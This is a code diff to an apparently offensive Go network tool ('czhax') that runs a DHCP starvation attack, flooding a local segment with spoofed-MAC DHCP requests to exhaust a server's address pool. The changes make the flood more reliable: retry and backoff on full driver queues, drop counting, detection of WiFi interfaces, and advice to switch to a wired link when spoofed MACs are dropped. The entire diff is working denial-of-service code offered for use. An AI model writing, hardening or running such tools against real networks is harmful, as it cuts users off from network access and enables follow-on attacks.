@@ -8,11 +8,14 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
+
+	"golang.org/x/sys/unix"
 )
 
 // DHCPStarvationConfig describes one DHCP starvation run.
@@ -34,6 +37,7 @@ type DHCPStarvationStats struct {
 	Unique    int
 	LastOffer string
 	PoolHint  int // highest host number seen, useful to estimate the pool size
+	Dropped   int // frames the driver refused (full queue), retried or skipped
 }
 
 const (
@@ -254,6 +258,9 @@ func ParseDHCPReply(frame []byte) (offerIP, serverID string, msgType uint8, ok b
 // DHCPStarvationStatsLine renders the one-line progress the UI shows.
 func DHCPStarvationStatsLine(s DHCPStarvationStats) string {
 	line := fmt.Sprintf("sent=%d offers=%d unique=%d", s.Sent, s.Offers, s.Unique)
+	if s.Dropped > 0 {
+		line += fmt.Sprintf(" drops=%d", s.Dropped)
+	}
 	if s.LastOffer != "" {
 		line += " last=" + s.LastOffer
 	}
@@ -280,6 +287,27 @@ func RunDHCPStarvation(ctx context.Context, cfg DHCPStarvationConfig, onLine fun
 	if inf.Flags&net.FlagUp == 0 {
 		return fmt.Errorf("%s is down", iface)
 	}
+	sock, err := openPacketSocket(iface)
+	if err != nil {
+		return fmt.Errorf("open %s: %w (needs root)", iface, err)
+	}
+	defer sock.close()
+	return runDHCPStarvation(ctx, inf, cfg, sock, emit)
+}
+
+// dhcpLink is the frame socket the flood needs; swapping it out keeps the
+// pacing/backoff logic testable without root or hardware.
+type dhcpLink interface {
+	writeWait(frame []byte, timeout time.Duration) error
+	read(buf []byte, timeout time.Duration) (int, error)
+	close()
+}
+
+// runDHCPStarvation floods the segment until Count is reached or ctx is done.
+// A full driver queue (EAGAIN/ENOBUFS) slows the run down instead of aborting
+// it, which is what happens at high rates on WiFi client interfaces.
+func runDHCPStarvation(ctx context.Context, inf *net.Interface, cfg DHCPStarvationConfig, link dhcpLink, emit func(string, ...any)) error {
+	iface := inf.Name
 	if cfg.Rate <= 0 {
 		cfg.Rate = 20
 	}
@@ -290,20 +318,13 @@ func RunDHCPStarvation(ctx context.Context, cfg DHCPStarvationConfig, onLine fun
 		cfg.Count = 0
 	}
 
-	sock, err := openPacketSocket(iface)
-	if err != nil {
-		return fmt.Errorf("open %s: %w (needs root)", iface, err)
-	}
-	defer sock.close()
-
-	// Probe the link with one frame before declaring the run healthy: WiFi
-	// client interfaces and some drivers reject raw Ethernet writes.
-	probeMAC := RandomClientMAC()
-	probe, err := BuildDHCPDiscover(probeMAC, rand.Uint32(), "czhax")
+	// Probe once before declaring the run healthy: drivers can reject raw
+	// Ethernet writes outright (EOPNOTSUPP/EPERM), which is worth reporting.
+	probe, err := BuildDHCPDiscover(RandomClientMAC(), rand.Uint32(), "czhax")
 	if err != nil {
 		return err
 	}
-	if err := sock.write(probe); err != nil {
+	if err := link.writeWait(probe, 150*time.Millisecond); err != nil {
 		return fmt.Errorf("%s rejects raw frames: %w (use a wired/tethered link or monitor mode)", iface, err)
 	}
 
@@ -313,12 +334,10 @@ func RunDHCPStarvation(ctx context.Context, cfg DHCPStarvationConfig, onLine fun
 	offers := make(map[string]struct{}, 256)
 
 	// Reader: collect OFFER/ACK replies and count distinct leases.
-	readerDone := make(chan struct{})
 	go func() {
-		defer close(readerDone)
 		buf := make([]byte, 2048)
 		for ctx.Err() == nil {
-			n, rerr := sock.read(buf, 100*time.Millisecond)
+			n, rerr := link.read(buf, 100*time.Millisecond)
 			if rerr != nil {
 				if ctx.Err() != nil {
 					return
@@ -357,6 +376,9 @@ func RunDHCPStarvation(ctx context.Context, cfg DHCPStarvationConfig, onLine fun
 	if len(inf.HardwareAddr) == 6 {
 		emit("link MAC %s", inf.HardwareAddr.String())
 	}
+	if IsWirelessIface(iface) {
+		emit("note: %s is a WiFi client; the AP/driver may rewrite or drop spoofed MACs — eth0/usb0 is more reliable", iface)
+	}
 
 	interval := time.Second / time.Duration(cfg.Rate)
 	if interval < time.Millisecond {
@@ -370,12 +392,29 @@ func RunDHCPStarvation(ctx context.Context, cfg DHCPStarvationConfig, onLine fun
 	hostname := fmt.Sprintf("czhax-%04x", rand.Intn(0xffff))
 	fixedMAC := RandomClientMAC()
 	start := time.Now()
+	noOfferWarned := false
+
+	summarise := func(prefix string, n int64) {
+		time.Sleep(500 * time.Millisecond)
+		statsMu.Lock()
+		final := stats
+		final.Sent = int(n)
+		statsMu.Unlock()
+		emit("%s: %s", prefix, DHCPStarvationStatsLine(final))
+		switch {
+		case final.Unique > 0 && final.PoolHint > 0:
+			emit("pool reach: offered host numbers up to .%d", final.PoolHint)
+		case final.Offers == 0 && final.Sent >= 50:
+			emit("no offers seen: verify a DHCP server is reachable (an AP may drop spoofed MACs; try a wired link)")
+		}
+	}
 
 	for {
 		select {
 		case <-ctx.Done():
 			statsMu.Lock()
 			final := stats
+			final.Sent = int(atomic.LoadInt64(&sent))
 			statsMu.Unlock()
 			emit("stopped after %s: %s", time.Since(start).Round(time.Second), DHCPStarvationStatsLine(final))
 			return ctx.Err()
@@ -383,8 +422,13 @@ func RunDHCPStarvation(ctx context.Context, cfg DHCPStarvationConfig, onLine fun
 			statsMu.Lock()
 			stats.Sent = int(atomic.LoadInt64(&sent))
 			line := DHCPStarvationStatsLine(stats)
+			offersSeen := stats.Offers
 			statsMu.Unlock()
 			emit("%s", line)
+			if !noOfferWarned && stats.Sent >= 50 && offersSeen == 0 {
+				noOfferWarned = true
+				emit("no offers yet: check there is a DHCP server, or the AP may drop spoofed MACs (try a wired link)")
+			}
 		case <-ticker.C:
 			mac := fixedMAC
 			if cfg.RandomMAC {
@@ -394,25 +438,61 @@ func RunDHCPStarvation(ctx context.Context, cfg DHCPStarvationConfig, onLine fun
 			if ferr != nil {
 				return ferr
 			}
-			if werr := sock.write(frame); werr != nil {
-				return fmt.Errorf("send on %s: %w", iface, werr)
+			if werr := link.writeWait(frame, 40*time.Millisecond); werr != nil {
+				// The driver queue is full: count it, give the radio a slot to
+				// drain and keep going rather than failing the whole run.
+				statsMu.Lock()
+				stats.Dropped++
+				dropped := stats.Dropped
+				statsMu.Unlock()
+				if dropped == 1 || dropped%50 == 0 {
+					emit("link busy (%v): %d request(s) dropped, throttling", werr, dropped)
+				}
+				time.Sleep(interval)
+				continue
 			}
 			n := atomic.AddInt64(&sent, 1)
 			if cfg.Count > 0 && int(n) >= cfg.Count {
-				// Give servers a moment to answer before summarising.
-				time.Sleep(500 * time.Millisecond)
-				statsMu.Lock()
-				final := stats
-				statsMu.Unlock()
-				atomic.StoreInt64(&sent, n)
-				emit("finished %d requests: %s", n, DHCPStarvationStatsLine(final))
-				if final.PoolHint > 0 {
-					emit("pool reach: offered host numbers up to .%d", final.PoolHint)
-				}
+				summarise(fmt.Sprintf("finished %d requests", n), n)
 				return nil
 			}
 		}
 	}
+}
+
+// write with a bounded wait for the driver queue to drain. EAGAIN/ENOBUFS on a
+// busy radio is normal at high rates, so this retries briefly instead of
+// failing the run.
+func (p *packetSocket) writeWait(frame []byte, timeout time.Duration) error {
+	if timeout <= 0 {
+		timeout = 25 * time.Millisecond
+	}
+	deadline := time.Now().Add(timeout)
+	for {
+		err := p.write(frame)
+		if err == nil {
+			return nil
+		}
+		if err != unix.EAGAIN && err != unix.EWOULDBLOCK && err != unix.ENOBUFS && err != unix.EINTR {
+			return err
+		}
+		if time.Now().After(deadline) {
+			return err
+		}
+		pfds := []unix.PollFd{{Fd: int32(p.fd), Events: unix.POLLOUT}}
+		_, _ = unix.Poll(pfds, 5)
+	}
+}
+
+// IsWirelessIface reports whether an interface is backed by a WiFi phy.
+func IsWirelessIface(name string) bool {
+	if _, err := os.Stat(filepath.Join("/sys/class/net", name, "wireless")); err == nil {
+		return true
+	}
+	if _, err := os.Stat(filepath.Join("/sys/class/net", name, "phy80211")); err == nil {
+		return true
+	}
+	return false
 }
 
 // DHCPStarvationUsage is the helper usage string shared with the CLI.
